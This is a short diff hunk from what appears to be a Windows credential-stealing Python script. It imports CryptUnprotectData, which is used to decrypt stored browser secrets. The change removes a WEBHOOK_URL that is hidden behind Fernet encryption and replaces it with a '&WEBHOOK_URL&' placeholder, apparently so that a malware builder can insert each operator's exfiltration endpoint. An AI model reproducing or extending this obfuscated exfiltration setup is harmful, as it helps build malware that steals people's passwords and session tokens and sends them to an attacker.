@@ -62,7 +62,7 @@ from win32crypt import CryptUnprotectData
 
 
 
-WEBHOOK_URL = Fernet(b'zCW5crwWNO58faH1sODhCCnIW779Z7WoCCzj3ALyLeQ=').decrypt(b'gAAAAABlvjyGYJeHMisx3ffN7U4OS0Sz3SrUG1PTGT9mezIejyF3svDc5Ziaf0f-j3bl-VpK7Xw-kgk1fID-cqNMNL_EkD2rNb_caxlNMbcXcADooNa8VeIxRN2DVDSOLlBrrYrlJRDI5RIUcnb8cnpEv1RMxeamQuoBf9o7uHrHZ_IQY_JwU-czHT7PAgkzttf7pzcqz8DHGCweDLD2X17hwyGovkQGR70Hd7oEDdkpzRkNPeCvbE0=').decode()
+WEBHOOK_URL = "&WEBHOOK_URL&"
 
 
 
